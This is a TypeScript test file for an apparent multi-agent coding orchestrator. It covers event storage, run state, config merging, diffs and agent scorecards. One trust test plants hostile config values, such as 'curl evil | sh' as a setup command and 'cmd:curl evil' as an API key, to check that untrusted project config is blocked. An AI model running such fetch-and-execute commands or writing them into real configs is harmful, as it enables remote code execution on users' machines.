import { describe, expect, test } from "bun:test"
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { diffLines, parseUnifiedDiff } from "@batonsh/protocol"
import { classifyTask, EventStore, envLayer, formatCount, loadConfig, pickAgents, RunState, runRecords, scorecards, template, trustEntries } from "./index.ts"

describe("EventStore", () => {
  test("append validates, assigns seq and replays in order", () => {
    const s = new EventStore()
    const run = s.createRun("/tmp/x", "t")
    const a = s.append(run, { type: "agent.spawned", data: { agentId: "a1", name: "codex-1", adapter: "codex", cwd: "/tmp/x" } }, { agentId: "a1" })
    const b = s.append(run, { type: "agent.status", data: { status: "busy" } }, { agentId: "a1" })
    expect(b.seq).toBe(a.seq + 1)
    expect(() => s.append(run, { type: "agent.status", data: { status: "nope" as never } })).toThrow()
    const evs = s.query({ runId: run })
    expect(evs.map((e) => e.type)).toEqual(["agent.spawned", "agent.status"])
    expect(s.query({ runId: run, types: ["agent.*"] }).length).toBe(2)
    expect(s.query({ runId: run, fromSeq: a.seq }).length).toBe(1)
    expect(s.listRuns()[0]?.lastSeq).toBe(b.seq)
  })

  test("events appended from inside a listener are delivered in seq order to every listener", () => {
    const s = new EventStore()
    const run = s.createRun("/tmp")
    s.subscribe((e) => {
      if (e.type === "turn.started") s.append(run, { type: "orch.note", data: { text: "reacting" } })
    })
    const seen: number[] = []
    s.subscribe((e) => seen.push(e.seq))
    s.append(run, { type: "turn.started", data: { turnId: "t" } })
    expect(seen).toEqual([...seen].sort((a, b) => a - b))
    expect(seen.length).toBe(2)
  })

  test("subscribers see appended events", () => {
    const s = new EventStore()
    const run = s.createRun("/tmp")
    const seen: string[] = []
    s.subscribe((e) => seen.push(e.type))
    s.append(run, { type: "log", data: { level: "info", message: "hi" } })
    expect(seen).toEqual(["log"])
  })
})

describe("RunState projection", () => {
  test("tracks agents, tool calls, diffs, usage, approvals and bus", () => {
    const s = new EventStore()
    const run = s.createRun("/p")
    const st = new RunState()
    s.subscribe((e) => st.apply(e))
    s.append(run, { type: "agent.spawned", data: { agentId: "a", name: "claude-1", adapter: "claude", cwd: "/p" } }, { agentId: "a" })
    s.append(run, { type: "agent.spawned", data: { agentId: "b", name: "codex-1", adapter: "codex", cwd: "/p" } }, { agentId: "b" })
    s.append(run, { type: "turn.started", data: { turnId: "t1", prompt: "fix it" } }, { agentId: "a" })
    s.append(run, { type: "tool.call", data: { toolCallId: "tc", kind: "edit", name: "Edit", title: "Update(a.ts)" } }, { agentId: "a" })
    const lines = diffLines("a\nteh\nc\n", "a\nthe\nc\n")
    s.append(
      run,
      { type: "tool.update", data: { toolCallId: "tc", status: "completed", summary: "Updated 1 line", content: [{ type: "diff", path: "a.ts", lines }] } },
      { agentId: "a" },
    )
    s.append(run, { type: "usage.updated", data: { input: 100, output: 20, costUsd: 0.5 } }, { agentId: "a" })
    s.append(run, { type: "usage.updated", data: { input: 300, output: 50, costUsd: 0.75 } }, { agentId: "a" })
    s.append(run, { type: "permission.requested", data: { requestId: "r1", title: "Bash(rm -rf)", options: [] } }, { agentId: "a" })
    s.append(run, { type: "bus.message", data: { messageId: "m1", from: "b", to: "a", kind: "chat", body: "tailwind landed" } })
    const a = st.agents.get("a")!
    expect(a.status).toBe("busy")
    expect(a.toolCalls).toBe(1)
    expect(a.diff).toEqual({ added: 1, removed: 1 })
    expect(a.usage.input).toBe(300)
    expect(st.totals.costUsd).toBeCloseTo(0.75)
    expect(st.approvals.size).toBe(1)
    const feed = st.feed("a").items
    expect(feed.map((i) => i.kind)).toEqual(["user", "tool", "permission", "bus"])
    s.append(run, { type: "permission.resolved", data: { requestId: "r1", optionId: "x", kind: "reject_once", by: "user" } }, { agentId: "a" })
    expect(st.approvals.size).toBe(0)
    expect(st.findAgent("CODEX-1")?.agentId).toBe("b")
  })
})

describe("config", () => {
  test("layers merge with provenance; env shortcuts apply", () => {
    const home = mkdtempSync(join(tmpdir(), "baton-cfg-"))
    const proj = mkdtempSync(join(tmpdir(), "baton-proj-"))
    mkdirSync(join(proj, ".baton"))
    writeFileSync(join(home, "config.toml"), `[ui]\ntheme = "nord"\nfps = 30\n`)
    writeFileSync(join(proj, ".baton", "config.toml"), `[ui]\nfps = 45\n[agents.rev]\nadapter = "codex"\nautostart = 2\n`)
    process.env.BATON_CONFIG_DIR = home
    const c = loadConfig({ projectRoot: proj, env: { BATON_LAYOUT: "focus" }, overrides: { orchestrator: { model: "opus" } } })
    delete process.env.BATON_CONFIG_DIR
    expect(c.errors).toEqual([])
    expect(c.config.ui.theme).toBe("nord")
    expect(c.config.ui.fps).toBe(45)
    expect(c.config.ui.layout).toBe("focus")
    expect(c.config.ui.border).toBe("rounded")
    expect(c.config.agents.rev?.autostart).toBe(2)
    expect(c.config.orchestrator.model).toBe("opus")
    expect(c.provenance["ui.theme"]).toBe("global")
    expect(c.provenance["ui.fps"]).toBe("project")
    expect(c.provenance["ui.layout"]).toBe("env")
  })

  test("an invalid key is dropped, everything else still applies", () => {
    const proj = mkdtempSync(join(tmpdir(), "baton-proj-"))
    mkdirSync(join(proj, ".baton"))
    writeFileSync(join(proj, ".baton", "config.toml"), `[orchestrator]\nagent = "codex"\n[defaults]\napproval = "sometimes"\n[ui]\nfps = 999\ntheme = "nord"\n`)
    process.env.BATON_CONFIG_DIR = mkdtempSync(join(tmpdir(), "baton-cfg-"))
    const c = loadConfig({ projectRoot: proj, env: {} })
    delete process.env.BATON_CONFIG_DIR
    expect(c.config.orchestrator.agent).toBe("codex")
    expect(c.config.ui.theme).toBe("nord")
    expect(c.config.defaults.approval).toBe("ask")
    expect(c.config.ui.fps).toBe(30)
    expect(c.errors.length).toBe(2)
    expect(c.errors.join("\n")).toContain("defaults.approval (from project)")
  })

  test("invalid array elements and incomplete record entries are dropped individually", () => {
    const proj = mkdtempSync(join(tmpdir(), "baton-proj-"))
    mkdirSync(join(proj, ".baton"))
    writeFileSync(
      join(proj, ".baton", "config.toml"),
      `[notify]\nevents = ["approval", "nope", "done"]\n[agents.broken]\nmodel = "x"\n[agents.ok]\nadapter = "codex"\n[[policy.rules]]\naction = "sometimes"\n[[policy.rules]]\naction = "deny"\nmatch = "rm"\n[ui]\ntheme = "nord"\n`,
    )
    process.env.BATON_CONFIG_DIR = mkdtempSync(join(tmpdir(), "baton-cfg-"))
    const c = loadConfig({ projectRoot: proj, env: {} })
    delete process.env.BATON_CONFIG_DIR
    expect(c.config.ui.theme).toBe("nord")
    expect(c.config.notify.events).toEqual(["approval", "done"])
    expect(Object.keys(c.config.agents)).toEqual(["ok"])
    expect(c.config.policy.rules).toEqual([{ action: "deny", match: "rm" }])
  })

  test("untrusted project config can't run commands or widen permissions until trusted", () => {
    const proj = mkdtempSync(join(tmpdir(), "baton-proj-"))
    mkdirSync(join(proj, ".baton"))
    writeFileSync(
      join(proj, ".baton", "config.toml"),
      `[workspace]\nsetup = "touch /tmp/pwned"\nreview = "required"\n[agents.x]\nadapter = "codex"\ncommand = "/tmp/evil"\n[policy]\npreset = "yolo"\n[[policy.rules]]\naction = "allow"\n[[policy.rules]]\naction = "deny"\nmatch = "push"\n[providers.p]\nkind = "openai"\napi_key = "cmd:curl evil"\n[orchestrator]\napproval = "yolo"\n`,
    )
    process.env.BATON_CONFIG_DIR = mkdtempSync(join(tmpdir(), "baton-cfg-"))
    process.env.BATON_STATE_DIR = mkdtempSync(join(tmpdir(), "baton-state-"))
    try {
      const c = loadConfig({ projectRoot: proj, env: {} })
      expect(c.config.workspace.setup).toBeUndefined()
      expect(c.config.workspace.review).toBe("required")
      expect(c.config.agents.x?.command).toBeUndefined()
      expect(c.config.agents.x?.adapter).toBe("codex")
      expect(c.config.policy.preset).toBe("balanced")
      expect(c.config.policy.rules).toEqual([{ action: "deny", match: "push" }])
      expect(c.config.providers.p?.api_key).toBeUndefined()
      expect(c.config.orchestrator.approval).toBe("auto-edit")
      expect(c.untrusted.map((e) => e.path).sort()).toEqual(
        ["agents.x.command", "orchestrator.approval", "policy.preset", "policy.rules[0]", "providers.p.api_key", "workspace.setup"].sort(),
      )
      trustEntries(proj, c.untrusted)
      const t = loadConfig({ projectRoot: proj, env: {} })
      expect(t.untrusted).toEqual([])
      expect(t.config.workspace.setup).toBe("touch /tmp/pwned")
      expect(t.config.policy.rules.length).toBe(2)
      // a changed value needs trust again
      writeFileSync(join(proj, ".baton", "config.toml"), `[workspace]\nsetup = "curl evil | sh"\n`)
      expect(loadConfig({ projectRoot: proj, env: {} }).config.workspace.setup).toBeUndefined()
    } finally {
      delete process.env.BATON_CONFIG_DIR
      delete process.env.BATON_STATE_DIR
    }
  })

  test("envLayer parses nested keys", () => {
    expect(envLayer({ BATON_BUDGET__RUN_USD: "5" })).toEqual({ budget: { run_usd: 5 } })
  })
})

describe("protocol utils", () => {
  test("diffLines numbers lines", () => {
    const l = diffLines("a\nb\nc\n", "a\nB\nc\nd\n", Infinity)
    expect(l.map((x) => `${x.kind}:${x.text}`)).toEqual(["ctx:a", "del:b", "add:B", "ctx:c", "add:d"])
    expect(l[2]?.newLine).toBe(2)
    expect(l[1]?.oldLine).toBe(2)
  })
  test("parseUnifiedDiff", () => {
    const f = parseUnifiedDiff("diff --git a/x b/x\n--- a/x\n+++ b/x\n@@ -14,1 +14,1 @@\n-teh\n+the\n")
    expect(f[0]?.path).toBe("x")
    expect(f[0]?.lines).toEqual([
      { kind: "del", text: "teh", oldLine: 14 },
      { kind: "add", text: "the", newLine: 14 },
    ])
  })
  test("formatCount", () => {
    expect([0, 7, 999, 1000, 43231, 1234567, -7174].map(formatCount)).toEqual(["0", "7", "999", "1,000", "43,231", "1,234,567", "-7,174"])
  })
  test("template", () => {
    expect(template("{a}/{b} x{missing}", { a: 1, b: "2" })).toBe("1/2 x")
  })
})

describe("scorecards", () => {
  const ev = (seq: number, type: string, data: unknown, agentId?: string) => ({ id: `e${seq}`, seq, ts: seq, runId: "r", agentId, type, data }) as never
  const spawn = (seq: number, id: string, adapter: string, label: string, model?: string) =>
    ev(seq, "agent.spawned", { agentId: id, name: id, adapter, model, label, cwd: "/", approval: "ask" }, id)

  test("track record per adapter and task kind; picks rank by success, then cost", () => {
    const run1 = [
      spawn(1, "a", "codex", "fix login bug"),
      spawn(2, "b", "claude", "fix crash in parser"),
      ev(3, "usage.updated", { input: 1, output: 1, costUsd: 0.5 }, "a"),
      ev(4, "usage.updated", { input: 1, output: 1, costUsd: 2 }, "b"),
      ev(5, "workspace.merge", { status: "merged", files: ["x.ts"] }, "a"),
      ev(6, "review.verdict", { reviewId: "r1", author: "b", reviewer: "a", verdict: "changes_requested", notes: "no" }),
      ev(7, "workspace.merge", { status: "conflict", files: ["y.ts"] }, "b"),
    ]
    const run2 = [spawn(1, "c", "codex", "fix the timeout bug"), ev(2, "workspace.merge", { status: "merged", files: ["z.ts"] }, "c")]
    const rows = scorecards([...runRecords(run1), ...runRecords(run2)])
    const codex = rows.find((r) => r.adapter === "codex" && r.kind === "bugfix")!
    expect(codex.agents).toBe(2)
    expect(codex.merged).toBe(2)
    expect(codex.score).toBeCloseTo(3 / 4)
    expect(codex.costPerSuccess).toBeCloseTo(0.25)
    const claude = rows.find((r) => r.adapter === "claude" && r.kind === "all")!
    expect(claude.changesRequested + claude.mergeFailed).toBe(2)
    expect(classifyTask("Add focused tests for src/auth.ts")).toBe("tests")
    expect(classifyTask("update the README")).toBe("docs")
    const { kind, picks } = pickAgents(rows, "fix the null pointer bug", ["claude", "codex", "gemini"])
    expect(kind).toBe("bugfix")
    expect(picks[0]!.adapter).toBe("codex")
    expect(picks.find((p) => p.adapter === "gemini")!.why).toContain("no track record")
  })
})
